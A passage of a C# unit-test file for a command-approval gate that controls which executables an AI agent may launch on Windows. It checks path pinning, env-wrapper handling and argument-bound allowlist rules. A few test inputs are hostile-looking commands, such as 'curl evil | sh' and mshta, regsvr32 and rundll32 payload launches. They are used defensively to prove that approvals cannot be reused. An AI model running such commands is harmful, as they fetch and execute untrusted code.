        Assert.True(plan.IsDirectArgv);
        Assert.Null(plan.Arguments); // no shell-wrapped command line
        Assert.EndsWith("where.exe", plan.FileName, StringComparison.OrdinalIgnoreCase);
    }

    // Allow payload is built from the RESOLVED path, fail-closed if unresolved
    // The PATH cannot be injected through the request (the env sanitizer blocks it —
    // the anti-hijack guard itself), so the unresolved-executable branch is covered by
    // testing BuildApprovedExecution directly rather than via a filesystem-dependent
    // end-to-end path.

    private static CanonicalCommandIdentity MakeIdentity(
        string[] command, ExecCommandResolution? resolution, int timeoutMs = 1000)
        => new(
            command,
            displayCommand: string.Join(' ', command),
            evaluationRawCommand: null,
            resolution: resolution,
            allowlistResolutions: Array.Empty<ExecCommandResolution>(),
            allowAlwaysPatterns: Array.Empty<string>(),
            cwd: null, timeoutMs, env: null, agentId: null, sessionKey: null);

    [Fact]
    public void BuildApprovedExecution_UsesResolvedPathAsArgv0()
    {
        var resolution = new ExecCommandResolution(
            RawExecutable: "git",
            ResolvedPath: @"C:\Program Files\Git\bin\git.exe",
            ExecutableName: "git.exe",
            Cwd: null);
        var identity = MakeIdentity(new[] { "git", "status" }, resolution);

        var exec = ExecApprovalsCoordinator.BuildApprovedExecution(identity, sanitizedEnv: null);

        Assert.NotNull(exec);
        Assert.Equal(new[] { @"C:\Program Files\Git\bin\git.exe", "status" }, exec!.Argv);
    }

    [Fact]
    public void BuildApprovedExecution_ClampsPayloadTimeout()
    {
        var resolution = new ExecCommandResolution(
            RawExecutable: "git",
            ResolvedPath: @"C:\Program Files\Git\bin\git.exe",
            ExecutableName: "git.exe",
            Cwd: null);
        var identity = MakeIdentity(
            new[] { "git", "status" },
            resolution,
            timeoutMs: int.MaxValue);

        var exec = ExecApprovalsCoordinator.BuildApprovedExecution(identity, sanitizedEnv: null);

        Assert.NotNull(exec);
        Assert.Equal(ExecApprovedExecution.MaxTimeoutMs, exec!.TimeoutMs);
    }

    [Fact]
    public void BuildApprovedExecution_UsesEffectiveCommandWhenEnvWrapperWasUnwrapped()
    {
        var resolution = new ExecCommandResolution(
            RawExecutable: "git",
            ResolvedPath: @"C:\Program Files\Git\bin\git.exe",
            ExecutableName: "git.exe",
            Cwd: null);
        var identity = MakeIdentity(new[] { "env", "git", "status" }, resolution);

        var exec = ExecApprovalsCoordinator.BuildApprovedExecution(identity, sanitizedEnv: null);

        Assert.NotNull(exec);
        Assert.Equal(2, exec!.Argv.Count);
        Assert.Equal(new[] { @"C:\Program Files\Git\bin\git.exe", "status" }, exec.Argv);
        Assert.NotEqual(new[] { @"C:\Program Files\Git\bin\git.exe", "git", "status" }, exec.Argv);
    }

    [Fact]
    public void BuildApprovedExecution_NestedTransparentEnvWrapper_EmitsUnwrappedPayload()
    {
        // A nested env wrapper with no modifiers (`env env git status`) is transparent:
        // the inner command is the real executable and the args are preserved verbatim.
        var resolution = new ExecCommandResolution(
            RawExecutable: "git",
            ResolvedPath: @"C:\Program Files\Git\bin\git.exe",
            ExecutableName: "git.exe",
            Cwd: null);
        var identity = MakeIdentity(new[] { "env", "env", "git", "status" }, resolution);

        var exec = ExecApprovalsCoordinator.BuildApprovedExecution(identity, sanitizedEnv: null);

        Assert.NotNull(exec);
        Assert.Equal(new[] { @"C:\Program Files\Git\bin\git.exe", "status" }, exec!.Argv);
    }

    [Theory]
    [InlineData("env", "FOO=bar", "node", "script.js")]
    [InlineData("env", "-i", "node", "script.js")]
    [InlineData("env", "--unset=FOO", "node", "script.js")]
    [InlineData("env", "env", "FOO=bar", "node", "script.js")] // nested modifier on the inner wrapper
    [InlineData("env", "env", "-i", "node", "script.js")]
    public void BuildApprovedExecution_ReturnsNull_WhenEnvHasModifiers(params string[] command)
    {
        // A modified env wrapper (assignments or flags) cannot be faithfully represented
        // in a direct-argv payload without the wrapper, so the payload must fail closed
        // rather than silently drop the modifier and run in a different environment.
        var resolution = new ExecCommandResolution(
            RawExecutable: "node",
            ResolvedPath: @"C:\Program Files\nodejs\node.exe",
            ExecutableName: "node.exe",
            Cwd: null);
        var identity = MakeIdentity(command, resolution);

        Assert.Null(ExecApprovalsCoordinator.BuildApprovedExecution(identity, sanitizedEnv: null));
    }

    [Fact]
    public async Task Allow_UnresolvedExecutable_FailsClosedViaHandleAsync()
    {
        WriteStoreFile("""{"version":1,"defaults":{"security":"full","ask":"off"}}""");
        // A bare name on no PATH resolves to a null path but is still a valid command,
        // so security=full approves it. The payload cannot pin an absolute executable,
        // so the allow must fail closed rather than execute an unpinnable command.
        var req = Req("""{"command":["zzz-nonexistent-tool-9c3f1a7b"]}""");
        var result = await MakeCoordinator().HandleAsync(req, "unresolved");
        Assert.Equal(ExecApprovalV2Code.InternalError, result.Code);
        Assert.Equal("unresolved-executable-on-allow", result.Reason);
    }

    [Fact]
    public async Task Allow_ModifiedEnvWrapper_FailsClosedWithNoStoreWrite()
    {
        // A modified env wrapper is approved (security=allowlist, ask=always, AllowAlways) but
        // the payload cannot carry the modifier semantics faithfully. The result must fail
        // validation and the store must not be modified.
        const string initialStore = """{"version":1,"defaults":{"security":"allowlist","ask":"always"}}""";
        WriteStoreFile(initialStore);
        var req = Req("""{"command":["env","FOO=bar","cmd","/c","echo","hello"]}""");
        var result = await MakeCoordinator(
            canPresent: AlwaysCanPresentEvaluator.Instance,
            prompt: new FixedDecisionPromptHandler(ExecApprovalPromptOutcome.AllowAlways))
            .HandleAsync(req, "env-modifier-no-persist");
        Assert.Equal(ExecApprovalV2Code.ValidationFailed, result.Code);
        var storeText = File.ReadAllText(Path.Combine(_dir, "exec-approvals.json"));
        Assert.Equal(initialStore, storeText);
    }

    [Fact]
    public void BuildApprovedExecution_ReturnsNull_WhenExecutableUnresolved()
    {
        // No resolved path → caller must fail closed rather than execute a command
        // whose identity cannot be pinned.
        var identity = MakeIdentity(new[] { "ghost", "arg" }, resolution: null);
        Assert.Null(ExecApprovalsCoordinator.BuildApprovedExecution(identity, sanitizedEnv: null));
    }

    [Theory]
    [InlineData(@"C:\scripts\deploy.bat")]
    [InlineData(@"C:\scripts\deploy.cmd")]
    [InlineData(@"C:\scripts\DEPLOY.BAT")]
    public void BuildApprovedExecution_ReturnsNull_WhenResolvedToBatchScript(string resolvedPath)
    {
        // A batch script needs cmd.exe, which re-parses arguments and breaks the
        // verbatim-argv guarantee, so the payload must fail closed before any approval
        // state is written rather than emit a payload the runner will later reject.
        var resolution = new ExecCommandResolution(
            RawExecutable: "deploy",
            ResolvedPath: resolvedPath,
            ExecutableName: System.IO.Path.GetFileName(resolvedPath),
            Cwd: null);
        var identity = MakeIdentity(new[] { "deploy", "arg" }, resolution);
        Assert.Null(ExecApprovalsCoordinator.BuildApprovedExecution(identity, sanitizedEnv: null));
    }

    [Theory]
    [InlineData(@"C:\Windows\System32\cmd.exe")]
    [InlineData(@"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe")]
    [InlineData(@"C:\Program Files\PowerShell\7\pwsh.exe")]
    [InlineData(@"C:\Program Files\Git\usr\bin\bash.exe")]
    [InlineData(@"C:\Windows\System32\wsl.exe")]
    [InlineData(@"C:\Windows\System32\cscript.exe")]
    [InlineData(@"C:\Windows\System32\wscript.exe")]
    public void BuildApprovedExecution_AllowsCommandHostAfterExplicitOneTimeApproval(string resolvedPath)
    {
        var resolution = new ExecCommandResolution(
            RawExecutable: System.IO.Path.GetFileNameWithoutExtension(resolvedPath),
            ResolvedPath: resolvedPath,
            ExecutableName: System.IO.Path.GetFileName(resolvedPath),
            Cwd: null);
        var identity = MakeIdentity(new[] { resolvedPath, "-c", "echo hi" }, resolution);
        var execution = ExecApprovalsCoordinator.BuildApprovedExecution(identity, sanitizedEnv: null);
        Assert.NotNull(execution);
        Assert.Equal(resolvedPath, execution!.Argv[0]);
    }

    [Fact]
    public async Task AllowOnce_CommandHost_RemainsAllowedWithoutPersistence()
    {
        const string initialStore =
            """{"version":1,"defaults":{"security":"allowlist","ask":"always"}}""";
        WriteStoreFile(initialStore);
        var result = await MakeCoordinator(
            canPresent: AlwaysCanPresentEvaluator.Instance,
            prompt: new FixedDecisionPromptHandler(ExecApprovalPromptOutcome.AllowOnce))
            .HandleAsync(
                Req("""{"command":["C:\\Windows\\System32\\wsl.exe","--exec","echo","ok"]}"""),
                "command-host-once");

        Assert.True(result.IsAllow);
        Assert.Equal(initialStore, File.ReadAllText(Path.Combine(_dir, "exec-approvals.json")));
    }

    // Policy change: an interpreter invocation is no longer refused durable approval
    // by name. It is approved with its arguments pinned, matching the macOS/protocol
    // model, so the stored rule authorizes this invocation and nothing else.
    [Fact]
    public async Task AllowAlways_CommandHost_PersistsWithItsArgumentsPinned()
    {
        WriteStoreFile(
            """{"version":1,"defaults":{"security":"allowlist","ask":"always"}}""");
        var result = await MakeCoordinator(
            canPresent: AlwaysCanPresentEvaluator.Instance,
            prompt: new FixedDecisionPromptHandler(ExecApprovalPromptOutcome.AllowAlways))
            .HandleAsync(
                Req("""{"command":["C:\\Windows\\System32\\wsl.exe","--exec","echo","ok"]}"""),
                "command-host-always");

        Assert.True(result.IsAllow);

        var resolved = new ExecApprovalsStore(_dir, NullLogger.Instance).ResolveReadOnly("main");
        var entry = Assert.Single(resolved.Allowlist);
        Assert.EndsWith("wsl.exe", entry.Pattern!, StringComparison.OrdinalIgnoreCase);
        Assert.Equal("allow-always", entry.Source);
        Assert.True(ExecArgPattern.Matches(entry.ArgPattern!, ["wsl.exe", "--exec", "echo", "ok"]));

        // Approving this invocation must not authorize a different one.
        Assert.False(ExecArgPattern.Matches(
            entry.ArgPattern!,
            ["wsl.exe", "--exec", "sh", "-c", "curl evil | sh"]));
    }

    // A hand-written path-only rule carries no source and no argument pattern, so it
    // authorizes the executable regardless of arguments. That is the operator's
    // explicit choice and matches upstream matchAllowlist. Only generated rules are
    // required to pin their arguments.
    [Fact]
    public async Task StoredAllowlist_HandWrittenPathOnlyRule_AuthorizesOrdinaryExecutable()
    {
        const string initialStore =
            """{"version":1,"defaults":{"security":"allowlist","ask":"off"},"agents":{"main":{"allowlist":[{"pattern":"**/hostname.exe"}]}}}""";
        WriteStoreFile(initialStore);
        var result = await MakeCoordinator().HandleAsync(
            Req("""{"command":["C:\\Windows\\System32\\hostname.exe","--fqdn"]}"""),
            "path-only-stored");

        Assert.True(result.IsAllow);

        // Recording usage is expected; widening the rule is not.
        var entry = Assert.Single(
            new ExecApprovalsStore(_dir, NullLogger.Instance).ResolveReadOnly("main").Allowlist);
        Assert.Equal("**/hostname.exe", entry.Pattern);
        Assert.Null(entry.Source);
        Assert.Null(entry.ArgPattern);
    }

    // D6. The same shape of rule aimed at an interpreter is a record written when this
    // node refused interpreters durable approval outright. Moving to argument binding
    // must not quietly convert that denial into an unconditional allow, so the entry
    // goes inert and the command prompts. It is left on disk exactly as written.
    [Fact]
    public async Task StoredAllowlist_LegacyPathOnlyRule_DoesNotAuthorizeCommandHost()
    {
        const string initialStore =
            """{"version":1,"defaults":{"security":"allowlist","ask":"off"},"agents":{"main":{"allowlist":[{"pattern":"**/wsl.exe"}]}}}""";
        WriteStoreFile(initialStore);
        var result = await MakeCoordinator().HandleAsync(
            Req("""{"command":["C:\\Windows\\System32\\wsl.exe","--exec","echo","ok"]}"""),
            "command-host-stored");

        Assert.Equal(ExecApprovalV2Code.AllowlistMiss, result.Code);
        Assert.Equal("allowlist-miss", result.Reason);
        Assert.Equal(initialStore, File.ReadAllText(Path.Combine(_dir, "exec-approvals.json")));
    }

    // D6 upgrade path: an explicit Allow always writes an argument-bound sibling, and
    // that sibling authorizes its own invocation from then on. The legacy entry is
    // still there and still inert.
    [Fact]
    public async Task ExplicitAllowAlways_RestoresReuseForAQuarantinedHost()
    {
        WriteStoreFile(
            """{"version":1,"defaults":{"security":"allowlist","ask":"always"},"agents":{"main":{"allowlist":[{"pattern":"**/wsl.exe"}]}}}""");
        var allowed = await MakeCoordinator(
            canPresent: AlwaysCanPresentEvaluator.Instance,
            prompt: new FixedDecisionPromptHandler(ExecApprovalPromptOutcome.AllowAlways))
            .HandleAsync(
                Req("""{"command":["C:\\Windows\\System32\\wsl.exe","--exec","echo","ok"]}"""),
                "command-host-upgrade");
        Assert.True(allowed.IsAllow);

        var allowlist = new ExecApprovalsStore(_dir, NullLogger.Instance)
            .ResolveReadOnly("main").Allowlist;
        Assert.Equal(2, allowlist.Count);
        var legacy = Assert.Single(allowlist, e => e.Source is null);
        Assert.Equal("**/wsl.exe", legacy.Pattern);
        Assert.Null(legacy.ArgPattern);

        var sibling = Assert.Single(allowlist, e => e.Source == "allow-always");
        Assert.NotNull(sibling.ArgPattern);
    }

    [Fact]
    public async Task HeadlessAllowlistFallback_HandWrittenPathOnlyRule_AuthorizesOrdinaryExecutable()
    {
        WriteStoreFile(
            """{"version":1,"defaults":{"security":"allowlist","ask":"always","askFallback":"allowlist"},"agents":{"main":{"allowlist":[{"pattern":"**/hostname.exe"}]}}}""");
        var result = await MakeCoordinator().HandleAsync(
            Req("""{"command":["C:\\Windows\\System32\\hostname.exe","--fqdn"]}"""),
            "path-only-fallback");

        Assert.True(result.IsAllow);

        var entry = Assert.Single(
            new ExecApprovalsStore(_dir, NullLogger.Instance).ResolveReadOnly("main").Allowlist);
        Assert.Equal("**/hostname.exe", entry.Pattern);
        Assert.Null(entry.Source);
        Assert.Null(entry.ArgPattern);
    }

    [Fact]
    public async Task HeadlessFullWithAllowlistFallback_HandWrittenPathOnlyRule_AuthorizesOrdinaryExecutable()
    {
        const string initialStore =
            """{"version":1,"defaults":{"security":"full","ask":"always","askFallback":"allowlist"},"agents":{"main":{"allowlist":[{"pattern":"**/hostname.exe"}]}}}""";
        WriteStoreFile(initialStore);
        var result = await MakeCoordinator().HandleAsync(
            Req("""{"command":["C:\\Windows\\System32\\hostname.exe","--fqdn"]}"""),
            "path-only-full-allowlist-fallback");

        Assert.True(result.IsAllow);
        Assert.Equal(initialStore, File.ReadAllText(Path.Combine(_dir, "exec-approvals.json")));
    }

    // The counterpart to the rule above: a *generated* path-only entry is a stale
    // pre-upgrade record that could authorize argv the operator never saw, so it
    // never matches. Upstream skips these in matchAllowlist for the same reason.
    [Fact]
    public async Task StoredAllowlist_GeneratedPathOnlyRule_DoesNotAuthorizeCommandHost()
    {
        const string initialStore =
            """{"version":1,"defaults":{"security":"allowlist","ask":"off"},"agents":{"main":{"allowlist":[{"pattern":"**/wsl.exe","source":"allow-always"}]}}}""";
        WriteStoreFile(initialStore);
        var result = await MakeCoordinator().HandleAsync(
            Req("""{"command":["C:\\Windows\\System32\\wsl.exe","--exec","echo","ok"]}"""),
            "command-host-generated-path-only");

        Assert.Equal(ExecApprovalV2Code.AllowlistMiss, result.Code);
        Assert.Equal("allowlist-miss", result.Reason);
    }

    [Fact]
    public async Task HeadlessFullFallback_CommandHost_RemainsAllowedWhenNotMatchDependent()
    {
        WriteStoreFile(
            """{"version":1,"defaults":{"security":"full","ask":"always","askFallback":"full"}}""");
        var result = await MakeCoordinator().HandleAsync(
            Req("""{"command":["C:\\Windows\\System32\\wsl.exe","--exec","echo","ok"]}"""),
            "command-host-full-fallback");

        Assert.True(result.IsAllow);
    }

    [Fact]
    public async Task SecurityFull_CommandHost_RemainsAllowed()
    {
        WriteStoreFile("""{"version":1,"defaults":{"security":"full","ask":"off"}}""");
        var result = await MakeCoordinator().HandleAsync(
            Req("""{"command":["C:\\Windows\\System32\\wsl.exe","--exec","echo","ok"]}"""),
            "command-host-full");

        Assert.True(result.IsAllow);
    }

    // D5: a strictly recognized canonical cmd carrier is authorized by the executable
    // it actually runs, but is executed exactly as it was received. Substituting the
    // bound direct argv would drop the carrier's in-band PATH and TEMP setup, which is
    // the only environment contract the sandbox currently accepts.
    [Fact]
    public async Task StoredHostnameRule_CanonicalCmdCarrier_AuthorizesInnerAndPreservesCarrier()
    {
        WriteStoreFile(
            """{"version":1,"defaults":{"security":"allowlist","ask":"off"},"agents":{"main":{"allowlist":[{"pattern":"**/hostname.exe"}]}}}""");

        var result = await MakeCoordinator().HandleAsync(
            Req($$"""{"command":["cmd.exe","/d","/s","/c","{{SystemHostnameJson}}"]}"""),
            "bound-hostname-stored");

        // A rule naming only the inner executable authorized the request, so the
        // carrier was looked through for the authorization decision.
        Assert.True(result.IsAllow);
        Assert.NotNull(result.Execution);

        // The executed command is the request with exactly the two pinned resolutions
        // applied: the system cmd.exe image, and the payload executable's resolved
        // absolute path. Nothing else may be rewritten, or the executed command could
        // drift from the approved one.
        Assert.Equal(
            [SystemCmdPath, "/d", "/s", "/c", result.Execution!.Argv[4]],
            result.Execution.Argv.ToArray());
        Assert.EndsWith(
            @"\hostname.exe",
            result.Execution.Argv[4],
            StringComparison.OrdinalIgnoreCase);
        Assert.True(Path.IsPathFullyQualified(result.Execution.Argv[4]));
    }

    [Fact]
    public async Task AllowAlways_CanonicalHostname_PersistsInnerExecutableAndPreservesCarrier()
    {
        WriteStoreFile(
            """{"version":1,"defaults":{"security":"allowlist","ask":"on-miss"}}""");

        var result = await MakeCoordinator(
            canPresent: AlwaysCanPresentEvaluator.Instance,
            prompt: new FixedDecisionPromptHandler(ExecApprovalPromptOutcome.AllowAlways))
            .HandleAsync(
                Req($$"""{"command":["cmd.exe","/d","/s","/c","{{SystemHostnameJson}}"]}"""),
                "bound-hostname-always");

        Assert.True(result.IsAllow);
        Assert.Equal(
            [SystemCmdPath, "/d", "/s", "/c", result.Execution!.Argv[4]],
            result.Execution.Argv.ToArray());
        Assert.EndsWith(
            @"\hostname.exe", result.Execution.Argv[4], StringComparison.OrdinalIgnoreCase);

        // The stored rule describes the inner executable, not the carrier, so a later
        // request that reaches the same program by another route is also authorized.
        var resolved = new ExecApprovalsStore(_dir, NullLogger.Instance).ResolveReadOnly("main");
        var entry = Assert.Single(resolved.Allowlist);
        Assert.EndsWith("hostname.exe", entry.Pattern!, StringComparison.OrdinalIgnoreCase);

        // Generated rules always pin their arguments and are marked as generated.
        Assert.Equal("allow-always", entry.Source);
        Assert.Equal("^\0\0$", entry.ArgPattern);
    }

    // Transport is chosen independently of which policy branch allowed the command. A
    // pre-approved security=full/ask=off run reaches process launch without a prompt, so
    // an unpinned carrier there would re-resolve both cmd.exe and its payload at launch
    // exactly as an unpinned one-time allow would.
    [Fact]
    public async Task PreApprovedFullPolicy_CanonicalCarrier_ExecutesThePinnedCarrier()
    {
        if (!OperatingSystem.IsWindows()) return;

        var (bound, payload) = FindBindablePayload();
        Assert.NotNull(bound);

        WriteStoreFile("""{"version":1,"defaults":{"security":"full","ask":"off"}}""");

        var result = await MakeCoordinator()
            .HandleAsync(
                Req($$"""{"command":["cmd.exe","/d","/s","/c","{{payload}}"]}"""),
                "full-carrier-preapproved");

        Assert.True(result.IsAllow);
        Assert.Equal(SystemCmdPath, result.Execution!.Argv[0], StringComparer.OrdinalIgnoreCase);
        Assert.NotEqual(payload, result.Execution.Argv[4]);
        Assert.True(Path.IsPathFullyQualified(result.Execution.Argv[4]));
        Assert.Equal(bound!.ExecutionArgv.ToArray(), result.Execution.Argv.ToArray());
    }

    // A direct command is resolved twice: once by the normalizer for the execution
    // identity and once by the binder for the identity that is displayed and stored.
    // Execution must use the binder's, so the image the operator approved is the image
    // that runs even if the two lookups of the same name could disagree.
    [Fact]
    public async Task AllowOnce_DirectCommand_ExecutesTheBoundResolution()
    {
        if (!OperatingSystem.IsWindows()) return;

        var bound = ExecReusableCommandBinder.TryBind(
            [SystemHostnamePath], cwd: null, env: null);
        Assert.NotNull(bound);
        Assert.False(bound!.IsCarrierTransport);

        WriteStoreFile(
            """{"version":1,"defaults":{"security":"allowlist","ask":"on-miss"}}""");

        var result = await MakeCoordinator(
            canPresent: AlwaysCanPresentEvaluator.Instance,
            prompt: new FixedDecisionPromptHandler(ExecApprovalPromptOutcome.AllowOnce))
            .HandleAsync(
                Req($$"""{"command":["{{SystemHostnameJson}}"]}"""),
                "direct-once");

        Assert.True(result.IsAllow);
        Assert.Equal(bound.Argv.ToArray(), result.Execution!.Argv.ToArray());
        Assert.Equal(bound.Pattern, result.Execution.Argv[0], StringComparer.OrdinalIgnoreCase);
        Assert.Empty(new ExecApprovalsStore(_dir, NullLogger.Instance).ResolveReadOnly("main").Allowlist);
    }

    // The carrier form survives a one-time allow, but both launch-time lookups are pinned:
    // argv[0] is the resolved system cmd.exe and the payload token is fully qualified. The
    // operator was shown the inner executable the binder resolved, so the request's own argv
    // must not be re-resolved against PATH or cwd after the decision.
    [Fact]
    public async Task AllowOnce_CanonicalHostname_ExecutesThePinnedCarrier()
    {
        if (!OperatingSystem.IsWindows()) return;

        var (bound, payload) = FindBindablePayload();
        Assert.NotNull(bound);

        WriteStoreFile(
            """{"version":1,"defaults":{"security":"allowlist","ask":"on-miss"}}""");

        var result = await MakeCoordinator(
            canPresent: AlwaysCanPresentEvaluator.Instance,
            prompt: new FixedDecisionPromptHandler(ExecApprovalPromptOutcome.AllowOnce))
            .HandleAsync(
                Req($$"""{"command":["cmd.exe","/d","/s","/c","{{payload}}"]}"""),
                "bound-payload-once");

        Assert.True(result.IsAllow);

        // argv[0] is the resolved system image, never a bare "cmd.exe" that Windows would
        // look up again at launch against a PATH the request does not control.
        Assert.Equal(SystemCmdPath, result.Execution!.Argv[0], StringComparer.OrdinalIgnoreCase);
        Assert.Equal(["/d", "/s", "/c"], result.Execution.Argv.Skip(1).Take(3).ToArray());

        // The payload token is pinned too, which is the observable difference from
        // executing the request's own argv verbatim.
        Assert.NotEqual(payload, result.Execution.Argv[4]);
        Assert.True(Path.IsPathFullyQualified(result.Execution.Argv[4]));
        Assert.EndsWith(
            @"\" + payload, result.Execution.Argv[4], StringComparison.OrdinalIgnoreCase);
        Assert.Equal(bound!.ExecutionArgv.ToArray(), result.Execution.Argv.ToArray());

        // A one-time allow still persists nothing: pinning is a transport choice only.
        Assert.Empty(new ExecApprovalsStore(_dir, NullLogger.Instance).ResolveReadOnly("main").Allowlist);
    }

    [Fact]
    public async Task StaticPipeline_WithInnerRules_StillPromptsOnceWithoutAllowAlways()
    {
        WriteStoreFile(
            """{"version":1,"defaults":{"security":"allowlist","ask":"on-miss"},"agents":{"main":{"allowlist":[{"pattern":"**/hostname.exe"},{"pattern":"**/findstr.exe"}]}}}""");
        var prompt = new CapturingPromptHandler(ExecApprovalPromptOutcome.Deny);

        var result = await MakeCoordinator(
            canPresent: AlwaysCanPresentEvaluator.Instance,
            prompt: prompt)
            .HandleAsync(
                Req("""{"command":["cmd.exe","/d","/s","/c","hostname.exe | findstr.exe host"]}"""),
                "pipeline-once");

        Assert.Equal(ExecApprovalV2Code.UserDenied, result.Code);
        Assert.NotNull(prompt.Captured);
        Assert.False(prompt.Captured!.AllowAlwaysAvailable);
    }

    // These executables select the code they run from their arguments. An earlier
    // revision refused durable approval for each by name. A name list is not a
    // boundary: renaming the image defeats it and the list can never be complete.
    // Durable approval now pins the arguments, so approving one invocation cannot
    // authorize a different payload later.
    [Theory]
    [InlineData("mshta.exe https://example.invalid/payload.hta")]
    [InlineData("regsvr32.exe /s payload.dll")]
    [InlineData("rundll32.exe payload.dll,EntryPoint")]
    public async Task WindowsCodeHost_AllowAlwaysBindsToTheApprovedPayloadOnly(string payload)
    {
        WriteStoreFile(
            """{"version":1,"defaults":{"security":"allowlist","ask":"on-miss"}}""");

        await MakeCoordinator(
            canPresent: AlwaysCanPresentEvaluator.Instance,
            prompt: new FixedDecisionPromptHandler(ExecApprovalPromptOutcome.AllowAlways))
            .HandleAsync(
                Req(JsonSerializer.Serialize(new
                {
                    command = new[] { "cmd.exe", "/d", "/s", "/c", payload }
                })),
                "windows-code-host");

        var resolved = new ExecApprovalsStore(_dir, NullLogger.Instance).ResolveReadOnly("main");
        var entry = Assert.Single(resolved.Allowlist);

        // The persisted rule carries the exact argument vector that was approved, so
        // the same host cannot be reused later to run something else.
        Assert.Equal("allow-always", entry.Source);
        Assert.False(string.IsNullOrEmpty(entry.ArgPattern));
        Assert.False(ExecArgPattern.Matches(
            entry.ArgPattern!,
            ["host.exe", "https://example.invalid/attacker.hta"]));
    }

    [Fact]
    public async Task AskAlways_StoredHostnameRule_StillPrompts()
    {
        WriteStoreFile(
            """{"version":1,"defaults":{"security":"allowlist","ask":"always"},"agents":{"main":{"allowlist":[{"pattern":"**/hostname.exe"}]}}}""");
        var prompt = new CapturingPromptHandler(ExecApprovalPromptOutcome.Deny);

        var result = await MakeCoordinator(
            canPresent: AlwaysCanPresentEvaluator.Instance,
            prompt: prompt)
            .HandleAsync(
                Req("""{"command":["cmd.exe","/d","/s","/c","hostname.exe"]}"""),
                "bound-hostname-ask-always");

        Assert.Equal(ExecApprovalV2Code.UserDenied, result.Code);
        Assert.NotNull(prompt.Captured);
        Assert.False(prompt.Captured!.AllowAlwaysAvailable);
    }

    [Fact]
    public async Task StoredWhereRule_TabDelimitedArgument_AuthorizesInnerAndPreservesCarrier()
    {
        WriteStoreFile(
            """{"version":1,"defaults":{"security":"allowlist","ask":"off"},"agents":{"main":{"allowlist":[{"pattern":"**/where.exe"}]}}}""");

        var result = await MakeCoordinator().HandleAsync(
            Req("""{"command":["cmd.exe","/d","/s","/c","where.exe\thello"]}"""),
            "bound-tab-delimited");

        Assert.True(result.IsAllow);
        Assert.Equal(
            [SystemCmdPath, "/d", "/s", "/c", result.Execution!.Argv[4]],
            result.Execution.Argv.ToArray());
        // Pinning replaces only the executable token; the tab and the argument after
        // it are preserved exactly.
        Assert.EndsWith(
            @"\where.exe" + "\thello",
            result.Execution.Argv[4],
            StringComparison.OrdinalIgnoreCase);
    }

    // Regression: an unbindable command must still show the operator a resolved
    // executable path. context.Resolution is the durably bindable command and is
    // null whenever nothing binds, so the prompt falls back to the carrier's own
    // resolution rather than asking for approval with no path displayed.
    [Fact]
    public async Task Prompt_UnbindableShellCommand_StillShowsResolvedPath()
    {
        WriteStoreFile(
            """{"version":1,"defaults":{"security":"allowlist","ask":"on-miss"}}""");
        var prompt = new CapturingPromptHandler(ExecApprovalPromptOutcome.Deny);

        await MakeCoordinator(
            canPresent: AlwaysCanPresentEvaluator.Instance,
            prompt: prompt)
            .HandleAsync(
                Req("""{"command":["cmd.exe","/d","/s","/c","hostname.exe | findstr.exe host"]}"""),
                "unbindable-resolved-path");

        Assert.NotNull(prompt.Captured);
        Assert.False(prompt.Captured!.AllowAlwaysAvailable);
        Assert.False(string.IsNullOrWhiteSpace(prompt.Captured.ResolvedPath));
        Assert.EndsWith(
            "cmd.exe",
            prompt.Captured.ResolvedPath!,
            StringComparison.OrdinalIgnoreCase);
    }

    // Low-level callers and upstream approval fixtures may provide a reconstructible
    // tokenized tail even though the live gateway currently sends one pre-joined
    // command element.
    [Fact]
    public async Task StoredWhereRule_MultiElementCarrierTail_AuthorizesInnerAndPreservesCarrier()
    {
        WriteStoreFile(
            """{"version":1,"defaults":{"security":"allowlist","ask":"off"},"agents":{"main":{"allowlist":[{"pattern":"**/where.exe"}]}}}""");

        var result = await MakeCoordinator().HandleAsync(
            Req("""{"command":["cmd.exe","/d","/s","/c","where.exe","hello"]}"""),
            "bound-multi-element-tail");

        Assert.True(result.IsAllow);
        Assert.Equal(6, result.Execution!.Argv.Count);
        Assert.Equal(
            [SystemCmdPath, "/d", "/s", "/c", result.Execution.Argv[4], "hello"],
            result.Execution.Argv.ToArray());
        Assert.EndsWith(
            @"\where.exe", result.Execution.Argv[4], StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public async Task AbsolutePathCmdCarrier_StoredRule_AuthorizesInnerAndPreservesCarrier()
    {
        WriteStoreFile(
            """{"version":1,"defaults":{"security":"allowlist","ask":"off"},"agents":{"main":{"allowlist":[{"pattern":"**/hostname.exe"}]}}}""");
        var cmdPath = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.System),
            "cmd.exe");

        var result = await MakeCoordinator().HandleAsync(
            Req(JsonSerializer.Serialize(new
            {
                command = new[] { cmdPath, "/d", "/s", "/c", SystemHostnamePath }
            })),
            "bound-absolute-cmd");

        Assert.True(result.IsAllow);
        Assert.Equal(
            [cmdPath, "/d", "/s", "/c", result.Execution!.Argv[4]],
            result.Execution.Argv.ToArray());
        Assert.EndsWith(
            @"\hostname.exe", result.Execution.Argv[4], StringComparison.OrdinalIgnoreCase);
    }

    // A prompt handler that reports AllowAlways under security=full must not widen
    // durable policy. Nothing persists under full, so the decision degrades to a
    // one-time allow rather than writing an allowlist entry the policy never had.
    [Fact]
    public async Task AllowAlways_UnderSecurityFull_PersistsNothing()
    {
        WriteStoreFile(
            """{"version":1,"defaults":{"security":"full","ask":"on-miss"}}""");

        var result = await MakeCoordinator(
            canPresent: AlwaysCanPresentEvaluator.Instance,
            prompt: new FixedDecisionPromptHandler(ExecApprovalPromptOutcome.AllowAlways))
            .HandleAsync(
                Req("""{"command":["cmd.exe","/d","/s","/c","hostname.exe"]}"""),
                "allow-always-full");

        Assert.True(result.IsAllow);
        var resolved = new ExecApprovalsStore(_dir, NullLogger.Instance).ResolveReadOnly("main");
        Assert.Empty(resolved.Allowlist);
    }

    [Fact]
    public void V2Result_IsAllow_FalseForAllDenyCodes()
    {
        Assert.False(ExecApprovalV2Result.SecurityDeny("x").IsAllow);
        Assert.False(ExecApprovalV2Result.UserDenied("x").IsAllow);
        Assert.False(ExecApprovalV2Result.ValidationFailed("x").IsAllow);
        Assert.False(ExecApprovalV2Result.InternalError("x").IsAllow);
    }

    // ── 21. ICanPresentEvaluator stubs ────────────────────────────────────────

    [Fact]
    public void AlwaysCannotPresent_AlwaysReturnsFalse()
    {
        Assert.False(AlwaysCannotPresentEvaluator.Instance.CanPresent(null));
        Assert.False(AlwaysCannotPresentEvaluator.Instance.CanPresent("session-key"));
    }

    [Fact]
    public void AlwaysCanPresent_AlwaysReturnsTrue()
    {
